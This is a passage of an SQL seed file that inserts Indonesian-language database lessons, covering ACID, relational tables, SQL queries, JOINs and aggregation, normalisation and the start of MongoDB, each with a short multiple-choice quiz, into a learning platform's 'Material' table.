A - Atomicity     → Semua operasi berhasil, atau tidak sama sekali
C - Consistency   → Data selalu valid sesuai constraint
I - Isolation     → Concurrent transaction tidak saling mengganggu
D - Durability    → Data tersimpan permanen setelah commit
```

ACID menjamin reliabilitas transaksi — khususnya penting di aplikasi keuangan di mana inkonsistensi bisa berarti kehilangan uang.

## Peran dalam Aplikasi Modern

Hampir semua aplikasi web/mobile menggunakan database untuk menyimpan: user, transaksi, konten, log, konfigurasi. Pemilihan database yang tepat menentukan skalabilitas dan keandalan sistem. Pola arsitektur modern:

- **Single DB** — aplikasi kecil, satu DB server
- **Master-slave replication** — write ke master, read dari slave
- **Sharding** — bagi data horizontal ke multiple server
- **CQRS** — terpisah antara command (write) dan query (read)
- **Polyglot persistence** — kombinasi berbagai DB sesuai use case

## Populer DB di Industri 2024

```text
RDBMS:
  PostgreSQL  → Open-source, fitur lengkap, standar industri startup
  MySQL       → Populer di PHP/LAMP stack, performa tinggi
  SQLite      → Embedded, zero-config, cocok untuk mobile/IoT
  SQL Server  → Microsoft, enterprise Windows
  Oracle      → Enterprise mahal, fitur sangat lengkap

NoSQL:
  MongoDB     → Document store terpopuler
  Redis       → In-memory key-value, super cepat
  Cassandra   → Column-family, write-heavy skala besar
  DynamoDB    → AWS managed, auto-scaling
```

## Tips & Best Practices

1. Pilih RDBMS untuk data yang butuh konsistensi kuat (keuangan, inventory). Pilih NoSQL untuk data dengan skema dinamis atau skala horizontal masif.
2. Mulai dengan SQLite — zero-config, tanpa server, cocok untuk belajar SQL di laptop tanpa instalasi rumit.
3. Backup otomatis harian dan test restore secara berkala — backup yang tidak pernah ditest = tidak ada backup.
4. Gunakan connection pooling (PgBouncer, HikariCP) untuk aplikasi production.
5. Monitor slow query dan optimasi dengan index sebelum naik ke hardware lebih besar.

## Kesimpulan

Database adalah komponen esensial setiap aplikasi modern. Dengan memahami perbedaan RDBMS vs NoSQL, jenis-jenis NoSQL, konsep ACID, dan komponen utama database, Anda dapat memilih teknologi yang tepat untuk setiap kasus. Mulailah dengan SQLite untuk belajar, lalu naik ke PostgreSQL untuk production — keduanya gratis dan powerful.



## Studi Kasus: Database E-Commerce

Tabel: Users, Products, Categories, Orders.

## Tips

> Mulai dengan SQL sebelum NoSQL.', '🗄️', false, '[{"question":"Perbedaan utama RDBMS dan NoSQL adalah?","options":["RDBMS lebih cepat dari NoSQL","RDBMS pakai tabel & SQL, NoSQL pakai document/key-value dengan skema fleksibel","RDBMS gratis, NoSQL berbayar","RDBMS untuk web, NoSQL untuk mobile"],"answer":1,"explanation":"RDBMS menyimpan data dalam tabel relasional dengan SQL dan skema kaku. NoSQL menyimpan dalam bentuk document/key-value/graph dengan skema fleksibel."},{"question":"Berikut yang BUKAN contoh RDBMS adalah?","options":["MySQL","PostgreSQL","MongoDB","SQLite"],"answer":2,"explanation":"MongoDB adalah database NoSQL tipe document store. MySQL, PostgreSQL, dan SQLite adalah RDBMS."},{"question":"Apa kepanjangan DBMS?","options":["Database Management System","Data Backup Management Service","Database Multi Schema","Direct Base Memory Storage"],"answer":0,"explanation":"DBMS = Database Management System, yaitu software untuk mengelola database (membuat, query, update, backup)."}]', NOW(), NOW());
INSERT INTO "Material" (id, level, "order", title, slug, description, content, icon, "isProject", quiz, "createdAt", "updatedAt") VALUES ('relational-database-sql', 5, 2, 'Relational Database SQL', 'relational-database-sql', 'Konsep relational database: table, row, column, primary/foreign key.', '# Relational Database SQL


![Relational Database SQL](https://sfile.chatglm.cn/images-ppt/d99f1a9c2724.png)

**Relational Database** menyimpan data dalam tabel saling berhubungan. Konsep ini diperkenalkan E.F. Codd (1970) dengan landasan matematis relational algebra, dan hingga kini mendominasi penyimpanan data terstruktur. **SQL (Structured Query Language)** adalah bahasa standar untuk berinteraksi dengannya — dirancang khusus untuk query data deklaratif (Anda bilang **apa** yang mau diambil, bukan **bagaimana**). PostgreSQL, MySQL, SQLite, SQL Server, dan Oracle semuanya berbasis konsep ini.

![Struktur relational database dengan tabel dan relasi](https://sfile.chatglm.cn/images-ppt/732bf850a843.jpeg)

## Anatomi Tabel

```sql
CREATE TABLE users (
  id         SERIAL PRIMARY KEY,
  email      VARCHAR(255) UNIQUE NOT NULL,
  name       VARCHAR(100) NOT NULL,
  created_at TIMESTAMP DEFAULT CURRENT_TIMESTAMP
);

CREATE TABLE posts (
  id         SERIAL PRIMARY KEY,
  user_id    INTEGER REFERENCES users(id),
  title      TEXT NOT NULL,
  content    TEXT,
  published  BOOLEAN DEFAULT false
);
```

- **Table** — entitas (users, posts, orders)
- **Column/Field** — atribut (id, email, name)
- **Row/Record** — satu baris data
- **Schema** — struktur tabel beserta tipe data
- **Database** — kumpulan tabel yang berelasi

## Kunci: Primary & Foreign Key

```text
PRIMARY KEY   → Unik untuk setiap row, tidak boleh NULL
                contoh: users.id

FOREIGN KEY   → Reference ke PK di tabel lain
                contoh: posts.user_id → users.id

UNIQUE        → Nilai unik tapi boleh NULL
NOT NULL      → Wajib diisi
DEFAULT       → Nilai default bila kosong
CHECK         → Validasi kondisi (age >= 0)
```

Primary key bisa single column (id) atau composite (post_id + tag_id di junction table). Foreign key menjaga **referential integrity** — tidak bisa insert post dengan user_id yang tidak ada di users.

## Tipe Data Umum

```text
INTEGER / SERIAL    → Bilangan bulat, SERIAL auto-increment
BIGINT              → Bilangan bulat besar (untuk ID di sistem besar)
VARCHAR(n)          → String dengan panjang maks n
TEXT                → String panjang tak terbatas
BOOLEAN             → true / false
TIMESTAMP           → Tanggal + waktu
DATE / TIME         → Hanya tanggal atau waktu
DECIMAL(p,s)        → Angka desimal presisi tetap (uang)
FLOAT / REAL        → Angka desimal floating point (tidak untuk uang)
JSON / JSONB        → Data JSON (PostgreSQL, MySQL 8+)
UUID                → Identifier unik universal
ARRAY               → Array (PostgreSQL)
```

## Constraint & Integrity

```sql
-- Multiple constraint
CREATE TABLE products (
  id          SERIAL PRIMARY KEY,
  name        VARCHAR(200) NOT NULL,
  price       DECIMAL(12,2) NOT NULL CHECK (price >= 0),
  stock       INTEGER DEFAULT 0 CHECK (stock >= 0),
  sku         VARCHAR(50) UNIQUE NOT NULL,
  created_at  TIMESTAMP DEFAULT NOW()
);

-- Foreign key dengan action
CREATE TABLE orders (
  id          SERIAL PRIMARY KEY,
  customer_id INTEGER REFERENCES users(id) ON DELETE RESTRICT,
  total       DECIMAL(12,2)
);
```

## Relasi Antar Tabel

```text
One-to-One     → 1 user = 1 profile (tambah user_id UNIQUE di profile)
One-to-Many    → 1 user = banyak posts (FK di posts) — PALING UMUM
Many-to-Many   → butuh junction table: posts_tags(post_id, tag_id)
Self-reference → employee.manager_id → employee.id
```

Untuk Many-to-Many, junction table berisi FK ke kedua tabel. PK-nya bisa composite (post_id + tag_id) atau id terpisah (lebih fleksibel).

## Normalisasi vs Denormalisasi

- **Normalisasi** — pecah tabel untuk hindari redundansi (3NF umumnya cukup)
- **Denormalisasi** — sengaja duplikasi untuk performa read (data warehouse)

Untuk OLTP (aplikasi transaksi), normalisasi menjamin konsistensi. Untuk OLAP (analitik/reporting), denormalisasi mempercepat query agregat.

## Index Singkat

```sql
-- Index untuk pencarian cepat
CREATE INDEX idx_users_email ON users(email);
CREATE INDEX idx_posts_user_id ON posts(user_id);
CREATE INDEX idx_posts_created ON posts(created_at DESC);
```

Index adalah topik besar di materi terpisah, tapi ingat: index kolom yang sering di-WHERE/JOIN/ORDER BY.

## Tips & Best Practices

1. Selalu set **foreign key constraint** dengan `ON DELETE CASCADE` atau `ON DELETE RESTRICT` agar integritas data terjaga otomatis.
2. Gunakan `SERIAL` atau `UUID` sebagai PK — jangan pakai email/nama yang bisa berubah.
3. Tambahkan `created_at` dan `updated_at` di setiap tabel untuk audit.
4. Konsisten penamaan: snake_case, tabel jamak (users, posts), kolom tunggal.
5. Untuk uang, SELALU pakai `DECIMAL`, bukan `FLOAT` (presisi penting).

## Kesimpulan

Relational database dengan SQL adalah fondasi penyimpanan data terstruktur. Dengan menguasai anatomi tabel, primary/foreign key, tipe data, constraint, dan jenis relasi (1:1, 1:N, M:N), Anda dapat merancang skema yang konsisten dan efisien. Gambar ER diagram di atas kertas sebelum membuat tabel — ini memaksa Anda berpikir soal relasi sebelum coding.



## Studi Kasus: Database E-Commerce

Tabel: Users, Products, Categories, Orders.

## Tips

> Mulai dengan SQL sebelum NoSQL.', '📊', false, '[{"question":"Apa fungsi PRIMARY KEY dalam tabel?","options":["Menghubungkan ke tabel lain","Identifikasi unik setiap row, tidak boleh NULL","Mempercepat pencarian saja","Menyimpan data terenkripsi"],"answer":1,"explanation":"PRIMARY KEY adalah kolom (atau kombinasi) yang unik untuk setiap row dan tidak boleh NULL. Contoh: id pada tabel users."},{"question":"Foreign key pada tabel posts yang mereferensikan users(id) menunjukkan relasi?","options":["Many-to-Many","One-to-One","One-to-Many","Tidak ada relasi"],"answer":2,"explanation":"Satu user bisa punya banyak posts, tapi setiap post milik satu user. Itu relasi One-to-Many yang paling umum."},{"question":"Tipe data yang TEPAT untuk kolom harga dalam rupiah adalah?","options":["INTEGER","VARCHAR","DECIMAL(10,2)","BOOLEAN"],"answer":2,"explanation":"Untuk uang gunakan DECIMAL(presisi, skala) agar tidak ada pembulatan yang hilang seperti pada FLOAT. DECIMAL(10,2) = maks 99999999.99."}]', NOW(), NOW());
INSERT INTO "Material" (id, level, "order", title, slug, description, content, icon, "isProject", quiz, "createdAt", "updatedAt") VALUES ('sql-query-basics', 5, 3, 'SQL Query Basics', 'sql-query-basics', 'SELECT, WHERE, ORDER BY, LIMIT, dan operator SQL dasar.', '# SQL Query Basics


![SQL Query Basics](https://sfile.chatglm.cn/images-ppt/a977022a91ca.png)

**SQL** adalah bahasa standar untuk query database relasional. Untuk membaca data, kita gunakan perintah **SELECT**. Modifikasi data menggunakan **INSERT**, **UPDATE**, **DELETE**. SQL adalah bahasa **deklaratif** — Anda menyatakan **apa** yang ingin diambil, database yang menentukan **bagaimana**. Ini berbeda dari bahasa prosedural (Python, Java) di mana Anda harus menjelaskan langkah demi langkah. Skill SQL dasar adalah prasyarat wajib bagi setiap developer, data analyst, dan DBA.

![Query SQL dasar dengan SELECT](https://sfile.chatglm.cn/images-ppt/732bf850a843.jpeg)

## SELECT Dasar

```sql
-- Ambil semua kolom
SELECT * FROM users;

-- Ambil kolom tertentu
SELECT id, email, name FROM users;

-- Beri alias
SELECT name AS nama_lengkap FROM users;

-- Hitung jumlah baris
SELECT COUNT(*) AS total_users FROM users;

-- Hilangkan duplikat
SELECT DISTINCT country FROM users;
```

Hindari `SELECT *` di production — ambil hanya kolom yang dibutuhkan untuk hemat bandwidth dan memory, serta memastikan perubahan skema tidak merusak aplikasi.

## WHERE & Operator

```sql
-- Filter data
SELECT * FROM users
WHERE age >= 18 AND status = ''active'';

-- Operator perbandingan & logika
SELECT * FROM products
WHERE price BETWEEN 1000 AND 5000
  AND category IN (''electronics'', ''book'')
  AND name LIKE ''Laptop%'';

-- NULL handling (pakai IS NULL bukan = NULL)
SELECT * FROM users WHERE deleted_at IS NULL;
```

Operator umum:

```text
=  !=  >  <  >=  <=        → perbandingan
AND  OR  NOT               → logika
BETWEEN x AND y            → range (inklusif)
IN (a, b, c)               → keanggotaan
LIKE ''pre%''  /  ''_x_''      → pattern (% multi char, _ single)
IS NULL  /  IS NOT NULL    → null check
EXISTS (subquery)          → existensi
```

## ORDER BY & LIMIT

```sql
-- Urutkan
SELECT * FROM posts
ORDER BY created_at DESC, title ASC;

-- Pagination
SELECT * FROM posts
ORDER BY id DESC
LIMIT 10 OFFSET 20;       -- halaman 3 (10 per halaman)
```

Untuk pagination besar (>100rb baris), `OFFSET` lambat karena harus skip baris. Gunakan **keyset pagination** (`WHERE id > last_id`) yang jauh lebih cepat.

## INSERT / UPDATE / DELETE

```sql
-- Tambah data
INSERT INTO users (email, name)
VALUES (''andi@mail.com'', ''Andi'');

-- Insert multiple rows
INSERT INTO users (email, name) VALUES
  (''budi@mail.com'', ''Budi''),
  (''citra@mail.com'', ''Citra'');

-- Insert dengan returning (PostgreSQL)
INSERT INTO users (email, name)
VALUES (''dewi@mail.com'', ''Dewi'')
RETURNING id, created_at;

-- Update data (selalu pakai WHERE!)
UPDATE users
SET name = ''Andi Wibowo'', updated_at = NOW()
WHERE id = 5;

-- Hapus data
DELETE FROM users WHERE id = 5;

-- Hapus semua (HATI-HATI!)
-- DELETE FROM users;   -- JANGAN lupa WHERE
```

## Agregasi Sederhana

```sql
-- Statistik dasar
SELECT
  COUNT(*)                AS total,
  AVG(price)              AS avg_price,
  MIN(price)              AS min_price,
  MAX(price)              AS max_price,
  SUM(stock)              AS total_stock
FROM products
WHERE category = ''electronics'';
```

## Pattern Matching dengan LIKE

```text
LIKE ''Laptop%''    → mulai dengan ''Laptop'' (apapun setelahnya)
LIKE ''%Laptop''    → diakhiri ''Laptop''
LIKE ''%top%''      → mengandung ''top'' di mana saja
LIKE ''L_top''      → 4 huruf, diawali ''L'' diakhiri ''top''
ILIKE             → case-insensitive (PostgreSQL)
```

LIKE lambat di tabel besar karena tidak bisa pakai index biasa. Untuk pencarian teks advanced, gunakan **full-text search** (`tsvector`, `tsquery` di PostgreSQL) atau Elasticsearch.

## Transaction (BEGIN/COMMIT)

```sql
BEGIN;

UPDATE accounts SET balance = balance - 100 WHERE id = 1;
UPDATE accounts SET balance = balance + 100 WHERE id = 2;

-- Bila semua OK
COMMIT;

-- Bila ada error, batalkan semua
-- ROLLBACK;
```

Transaction menjamin atomicity — kedua update berhasil bareng, atau tidak sama sekali. Sangat penting untuk transfer uang, pemesanan, dan operasi multi-tabel lainnya.

## Tips & Best Practices

1. Saat UPDATE/DELETE, selalu jalankan `SELECT` dengan WHERE yang sama dulu untuk verifikasi baris yang akan terdampak.
2. Selalu pakai `WHERE` di UPDATE/DELETE — tanpa WHERE, semua baris terkena!
3. Gunakan `BEGIN/COMMIT` untuk operasi multi-statement yang harus atomic.
4. Hindari `SELECT *` di production — sebut kolom yang dibutuhkan.
5. Untuk pagination besar, gunakan keyset (`WHERE id > last_id`) bukan OFFSET.

## Kesimpulan

SQL dasar (SELECT, WHERE, ORDER BY, LIMIT, INSERT, UPDATE, DELETE) adalah fondasi yang harus dikuasai sebelum melangkah ke topik advanced seperti JOIN dan agregasi. Dengan memahami operator, pattern matching, dan transaction, Anda dapat mengelola data di database relasional secara efektif. Latih di SQLZoo atau LeetCode Database — praktik 20 soal SELECT akan terasa jauh lebih melekat daripada sekadar membaca teori.



## Studi Kasus: Database E-Commerce

Tabel: Users, Products, Categories, Orders.

## Tips

> Mulai dengan SQL sebelum NoSQL.', '🔍', false, '[{"question":"Klausa SQL untuk membatasi jumlah baris hasil query adalah?","options":["WHERE","ORDER BY","LIMIT","GROUP BY"],"answer":2,"explanation":"LIMIT membatasi jumlah baris yang dikembalikan. Kombinasi LIMIT + OFFSET untuk pagination."},{"question":"Operator yang benar untuk mencari nama berawalan ''Laptop'' adalah?","options":["name = ''Laptop*''","name LIKE ''Laptop%''","name MATCH ''Laptop''","name BEGINS ''Laptop''"],"answer":1,"explanation":"Operator LIKE dengan wildcard % (nol/lebih karakter) dan _ (satu karakter). ''Laptop%'' cocok dengan ''Laptop'', ''Laptop Gaming'', dll."},{"question":"Cara yang BENAR untuk mengecek nilai NULL di SQL?","options":["WHERE column = NULL","WHERE column == NULL","WHERE column IS NULL","WHERE column EQUALS NULL"],"answer":2,"explanation":"NULL tidak bisa dibandingkan dengan = (hasilnya NULL, bukan true/false). Gunakan IS NULL atau IS NOT NULL."}]', NOW(), NOW());
INSERT INTO "Material" (id, level, "order", title, slug, description, content, icon, "isProject", quiz, "createdAt", "updatedAt") VALUES ('sql-advanced-join', 5, 4, 'SQL Advanced JOIN Aggregation', 'sql-advanced-join', 'INNER/LEFT/RIGHT JOIN, GROUP BY, HAVING, dan aggregate function.', '# SQL Advanced: JOIN & Aggregation


![SQL Advanced JOIN Aggregation](https://sfile.chatglm.cn/images-ppt/a977022a91ca.png)

**JOIN** menggabungkan data dari beberapa tabel berdasarkan relasi. **Aggregation** merangkum banyak baris menjadi satu nilai (count, sum, average). Kedua skill ini esensial untuk analisis data nyata — hampir semua laporan bisnis (dashboard, revenue, statistik) dibangun dari JOIN + GROUP BY. Menguasai JOIN dan agregasi membedakan developer pemula dari yang mahir — di sinilah SQL benar-benar bersinar dibanding processing manual di aplikasi.

![Diagram Venn berbagai jenis JOIN](https://sfile.chatglm.cn/images-ppt/732bf850a843.jpeg)

## Jenis JOIN

```text
INNER JOIN  → Hanya baris yang match di kedua tabel (irisan)
LEFT JOIN   → Semua baris kiri + match kanan (NULL jika tidak match)
RIGHT JOIN  → Semua baris kanan + match kiri
FULL JOIN   → Semua baris dari kedua tabel
CROSS JOIN  → Cartesian product (kombinasi semua, hati-hati!)
SELF JOIN   → Tabel di-JOIN dengan dirinya sendiri
```

Visualisasi dengan diagram Venn membantu memilih JOIN yang tepat. LEFT JOIN paling sering dipakai karena memastikan tidak ada data dari tabel utama yang hilang.

## Contoh JOIN

```sql
-- INNER JOIN: user beserta post-nya
SELECT u.name, p.title
FROM users u
INNER JOIN posts p ON u.id = p.user_id;

-- LEFT JOIN: SEMUA user, meski tanpa post
SELECT u.name, COUNT(p.id) AS post_count
FROM users u
LEFT JOIN posts p ON u.id = p.user_id
GROUP BY u.id, u.name;

-- SELF JOIN: hierarki karyawan-manajer
SELECT e.name AS employee, m.name AS manager
FROM employees e
LEFT JOIN employees m ON e.manager_id = m.id;
```

## Aggregate Functions

```text
COUNT(*)          → jumlah baris
COUNT(DISTINCT x) → jumlah nilai unik
SUM(x)            → total
AVG(x)            → rata-rata
MIN(x) / MAX(x)   → nilai ekstrem
STRING_AGG(x, '','')→ gabung string (PostgreSQL)
ARRAY_AGG(x)      → gabung jadi array (PostgreSQL)
BOOL_OR(x)        → true jika ada yang true
BOOL_AND(x)       → true jika semua true
```

## GROUP BY & HAVING

```sql
-- Total post per user, hanya yang punya ≥ 3
SELECT u.name, COUNT(p.id) AS total_posts
FROM users u
LEFT JOIN posts p ON u.id = p.user_id
GROUP BY u.id, u.name
HAVING COUNT(p.id) >= 3
ORDER BY total_posts DESC;
```

Bedanya:

```text
WHERE  → filter baris SEBELUM agregasi
HAVING → filter hasil SETELAH agregasi
```

Aturan: kolom di SELECT (selain agregat) harus ada di GROUP BY. PostgreSQL ketat soal ini; MySQL dengan mode default juga ketat sejak v5.7.

## Subquery & CTE

```sql
-- Subquery
SELECT name, age FROM users
WHERE age > (SELECT AVG(age) FROM users);

-- CTE (Common Table Expression) - lebih readable
WITH active_users AS (
  SELECT * FROM users WHERE status = ''active''
)
SELECT u.name, COUNT(p.id)
FROM active_users u
LEFT JOIN posts p ON u.id = p.user_id
GROUP BY u.id, u.name;

-- Recursive CTE untuk hierarki
WITH RECURSIVE org AS (
  SELECT id, name, manager_id, 1 AS level
  FROM employees WHERE manager_id IS NULL
  UNION ALL
  SELECT e.id, e.name, e.manager_id, o.level + 1
  FROM employees e JOIN org o ON e.manager_id = o.id
)
SELECT * FROM org;
```

CTE (`WITH`) membuat query complex lebih readable dan dapat di-chain. Recursive CTE sangat powerful untuk tree/graph traversal.

## Window Functions

```sql
-- Ranking user berdasarkan jumlah post
SELECT
  u.name,
  COUNT(p.id) AS post_count,
  RANK() OVER (ORDER BY COUNT(p.id) DESC) AS rank,
  ROW_NUMBER() OVER (ORDER BY COUNT(p.id) DESC) AS row_num
FROM users u
LEFT JOIN posts p ON u.id = p.user_id
GROUP BY u.id, u.name;

-- Running total
SELECT
  order_date,
  revenue,
  SUM(revenue) OVER (ORDER BY order_date) AS running_total
FROM daily_revenue;
```

Window function (`OVER`) melakukan agregasi tanpa collapse baris — sangat berguna untuk ranking, running total, dan analisis time-series.

## Tips Performa JOIN

1. Pastikan kolom JOIN ter-INDEX (terutama FK)
2. Hindari SELECT *, ambil kolom yang perlu
3. Filter di WHERE sebelum JOIN bila memungkinkan
4. EXPLAIN ANALYZE untuk lihat query plan

```sql
EXPLAIN ANALYZE
SELECT u.name, COUNT(p.id)
FROM users u LEFT JOIN posts p ON u.id = p.user_id
GROUP BY u.id;
```

## Jenis Join di PostgreSQL Lainnya

- `LATERAL` — subquery bisa akses kolom tabel outer
- `NATURAL JOIN` — JOIN otomatis berdasarkan nama kolom sama (hindari, rentan bug)
- `USING (col)` — shorthand jika nama kolom sama di kedua tabel

## Tips & Best Practices

1. LEFT JOIN adalah default terbaik saat Anda ingin memastikan tidak ada data dari tabel kiri yang hilang karena tidak ada match.
2. Gunakan alias tabel (`u`, `p`) untuk query lebih ringkas — tapi konsisten dan jelas.
3. Untuk query kompleks, pecah dengan CTE (`WITH`) supaya readable.
4. Hindari `SELECT *` di JOIN — ambil kolom spesifik.
5. Untuk "tidak ada match" pattern, gunakan `LEFT JOIN ... WHERE right.id IS NULL` atau `NOT EXISTS`.

## Kesimpulan

JOIN dan aggregation adalah jantung SQL untuk analisis data. Dengan menguasai INNER/LEFT/RIGHT JOIN, GROUP BY/HAVING, subquery, CTE, dan window function, Anda dapat menjawab hampir semua pertanyaan bisnis dari data. Gambar diagram Venn JOIN di atas kertas — visualisasi ini akan sangat membantu saat memilih jenis JOIN yang tepat untuk setiap kasus.



## Studi Kasus: Database E-Commerce

Tabel: Users, Products, Categories, Orders.

## Tips

> Mulai dengan SQL sebelum NoSQL.', '🔗', false, '[{"question":"JOIN yang mengembalikan SEMUA baris dari tabel kiri meski tidak ada match di tabel kanan adalah?","options":["INNER JOIN","LEFT JOIN","RIGHT JOIN","CROSS JOIN"],"answer":1,"explanation":"LEFT JOIN mengembalikan semua baris tabel kiri. Kolom dari tabel kanan akan bernilai NULL bila tidak ada match."},{"question":"Perbedaan WHERE dan HAVING adalah?","options":["Tidak ada perbedaan","WHERE filter sebelum agregasi, HAVING filter setelah agregasi","WHERE untuk SELECT, HAVING untuk UPDATE","WHERE lebih cepat dari HAVING"],"answer":1,"explanation":"WHERE memfilter baris individual sebelum GROUP BY, sedangkan HAVING memfilter hasil agregat setelah GROUP BY."},{"question":"Query untuk menghitung jumlah post per user adalah?","options":["SELECT user, COUNT(*) FROM posts","SELECT user_id, COUNT(*) FROM posts GROUP BY user_id","SELECT COUNT(post) GROUP BY user","SELECT user_id, SUM(*) FROM posts"],"answer":1,"explanation":"Untuk menghitung per kelompok, gunakan GROUP BY user_id lalu COUNT(*). Tanpa GROUP BY, COUNT hanya mengembalikan satu angka total."}]', NOW(), NOW());
INSERT INTO "Material" (id, level, "order", title, slug, description, content, icon, "isProject", quiz, "createdAt", "updatedAt") VALUES ('database-design-normalisasi', 5, 5, 'Database Design & Normalisasi', 'database-design-normalisasi', 'ER diagram, normalisasi 1NF/2NF/3NF, dan best practice design.', '# Database Design & Normalisasi


![Database Design & Normalisasi](https://sfile.chatglm.cn/images-ppt/65e4540aa5b5.jpg)

**Database design** yang baik membuat sistem cepat, konsisten, dan mudah dipelihara. **Normalisasi** adalah proses menyusun tabel untuk mengurangi redundansi dan anomali data. **ER Diagram** adalah alat visual untuk merancang skema sebelum coding. Desain yang buruk menghasilkan data tidak konsisten, query lambat, dan migrasi yang menyiksa. Sebaliknya, desain baik bisa bertahan puluhan tahun (banyak skema bank masih mirip desain 1970-an). Investasi waktu di fase desain selalu lebih murah dari refactor di production.

![ER Diagram dan proses normalisasi](https://sfile.chatglm.cn/images-ppt/732bf850a843.jpeg)

## ER Diagram (Entity-Relationship)

```text
[Entity] ---(relationship)---> [Entity]
   |                              |
  attributes                   attributes

Contoh:
  User ---< Posts >--- Tags
  (1)         (M:N)

  Customer ---< Orders ---< OrderItems >--- Products
```

Komponen ERD:

- **Entity** — tabel (persegi)
- **Attribute** — kolom (oval)
- **Relationship** — garis dengan kardinalitas (1:1, 1:N, M:N)
- **Primary key** — underline pada atribut
- **Notation** — Chen, Crow''s Foot, UML (paling umum: Crow''s Foot)

## Normalisasi: 1NF, 2NF, 3NF

```text
1NF → Atomik (tidak ada nilai ganda/komplit dalam 1 sel)
2NF → 1NF + tidak ada partial dependency (PK komposit)
3NF → 2NF + tidak ada transitive dependency (non-PK → non-PK)
BCNF → 3NF yang lebih ketat
4NF, 5NF → kasus khusus (multi-valued dependency)
```

Tujuan normalisasi: eliminasi anomali (insert, update, delete) dan redundansi. Sebagian besar aplikasi cukup sampai 3NF.

### Contoh Sebelum Normalisasi (0NF)

```text
orders:
  order_id | customer_name | products
  ---------+---------------+------------------------
  1        | Andi          | "Laptop, Mouse, Keyboard"
```

Masalah: kolom products tidak atomik → melanggar 1NF. Juga ada redundansi nama customer di setiap order (anomali update).

### Setelah Normalisasi (3NF)

```sql
-- customers (master data)
CREATE TABLE customers (
  id    SERIAL PRIMARY KEY,
  name  VARCHAR(100) NOT NULL
);

-- orders (header)
CREATE TABLE orders (
  id           SERIAL PRIMARY KEY,
  customer_id  INTEGER REFERENCES customers(id),
  order_date   TIMESTAMP DEFAULT NOW()
);

-- order_items (detail)
CREATE TABLE order_items (
  id         SERIAL PRIMARY KEY,
  order_id   INTEGER REFERENCES orders(id),
  product    VARCHAR(100),
  qty        INTEGER,
  price      DECIMAL(10,2)
);
```

Sekarang: nama customer disimpan sekali di `customers`. Detail produk per order di `order_items`. Tidak ada redundansi.

## Anomali yang Dihilangkan Normalisasi

- **Insert anomaly** — tidak bisa insert order tanpa data customer lengkap (0NF)
- **Update anomaly** — ganti nama customer harus update banyak baris, rentan miss
- **Delete anomaly** — hapus order terakhir customer bisa hapus info customer

Dengan 3NF, semua anomali ini hilang karena data terpisah sesuai entitas.

## Best Practice Design

1. **Pilih PK yang stabil** — SERIAL/UUID lebih baik daripada email (yang bisa berubah)
2. **Hindari redundancy** — jangan simpan nama user di tabel orders, cukup user_id
3. **Index kolom yang sering di-WHERE/JOIN** — terutama FK
4. **Pakai tipe data sekecil mungkin** — SMALLINT bila cukup, jangan BIGINT jika tidak perlu
5. **Tambahkan created_at & updated_at** di setiap tabel untuk audit
6. **Soft delete** (kolom deleted_at) bila perlu audit dan recovery
7. **Naming konsisten** — snake_case, jamak untuk tabel, tunggal untuk kolom
8. **Foreign key constraint WAJIB** — jangan andalkan aplikasi untuk integritas

## Pattern Design Umum

```text
- Single table inheritance   → 1 tabel untuk semua tipe (simple, banyak NULL)
- Class table inheritance    → 1 tabel parent + 1 tabel per subtype
- Junction table             → untuk M:N (post_tags)
- Slowly Changing Dimension  → untuk data warehouse (SCD Type 2)
- Snapshot                   → simpan nilai historis (price di order_items)
```

## Kapan Denormalisasi?

Untuk performa baca ekstrem (data warehouse, dashboard real-time), denormalisasi (menyengaja menambah redundansi) bisa diterima. Tapi untuk OLTP, tetap normalisasi.

Tanda perlu denormalisasi:
- Query agregat berat yang sering dijalankan (>1 detik)
- JOIN 5+ tabel untuk dashboard
- Pattern read-heavy dengan write jarang

Alternatif denormalisasi: **materialized view**, **cache layer** (Redis), **read replica**.

## Tools Design

- **dbdiagram.io** — online, syntax DSL, export SQL
- **drawSQL** — visual drag-drop
- **MySQL Workbench** — official MySQL, reverse engineer
- **DBeaver** — universal DB tool dengan ERD
- **Prisma Studio** — visualisasi skema Prisma ORM

## Tips & Best Practices

1. "Normalize until it hurts, denormalize until it works" — Josh Berkus.
2. Selalu gambar ERD sebelum coding — tekanan visual memaksa berpikir relasi.
3. Validasi desain dengan skenario use case (apakah query X bisa dijawab efisien?).
4. Pertimbangkan growth — apakah skema tetap performant di 10x data?
5. Diskusikan dengan tim sebelum finalize — biaya refactor desain di awal jauh lebih murah.

## Kesimpulan

Desain database yang baik dimulai dari ER diagram yang matang, dilanjutkan normalisasi hingga 3NF, dan diakhiri dengan best practice naming + indexing. Walau denormalisasi kadang perlu untuk performa, default-nya normalisasi. Dengan tool seperti dbdiagram.io dan pemahaman 1NF/2NF/3NF, Anda dapat merancang skema yang konsisten, efisien, dan tahan uji waktu.



## Studi Kasus: Database E-Commerce

Tabel: Users, Products, Categories, Orders.

## Tips

> Mulai dengan SQL sebelum NoSQL.', '🏗️', false, '[{"question":"Bentuk normal yang menjamin setiap sel tabel berisi nilai atomik (tidak ganda) adalah?","options":["1NF","2NF","3NF","BCNF"],"answer":0,"explanation":"1NF (First Normal Form) mensyaratkan setiap kolom berisi nilai atomik/ tunggal. Tidak boleh ada list dipisah koma dalam satu sel."},{"question":"Apa yang harus dilakukan untuk relasi Many-to-Many antara posts dan tags?","options":["Tambah kolom tags di tabel posts","Tambah kolom posts di tabel tags","Buat junction table posts_tags dengan FK ke keduanya","Tidak mungkin diimplementasikan"],"answer":2,"explanation":"Many-to-Many butuh junction table (post_tags) berisi post_id dan tag_id sebagai foreign key. PK-nya gabungan keduanya (atau id terpisah)."},{"question":"Praktik terbaik untuk primary key user adalah?","options":["Email user","Nama lengkap","SERIAL/UUID auto-generated","Nomor telepon"],"answer":2,"explanation":"PK harus stabil & tidak berubah. Email bisa berubah, nama tidak unik. SERIAL (auto-increment) atau UUID adalah pilihan terbaik."}]', NOW(), NOW());
INSERT INTO "Material" (id, level, "order", title, slug, description, content, icon, "isProject", quiz, "createdAt", "updatedAt") VALUES ('nosql-database-mongodb', 5, 6, 'NoSQL Database MongoDB', 'nosql-database-mongodb', 'MongoDB, document store, CRUD, dan kapan menggunakan NoSQL.', '# NoSQL Database MongoDB


![NoSQL Database MongoDB](https://sfile.chatglm.cn/images-ppt/d43c88c0cb94.png)

